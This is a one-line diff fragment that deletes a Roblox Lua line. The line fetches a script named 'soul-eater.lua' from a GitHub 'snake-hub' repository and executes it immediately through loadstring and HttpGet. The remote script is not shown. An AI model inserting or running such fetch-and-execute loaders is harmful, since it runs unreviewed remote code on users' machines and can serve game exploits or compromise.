@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/toosiwhip/snake-hub/main/soul-eater.lua"))()
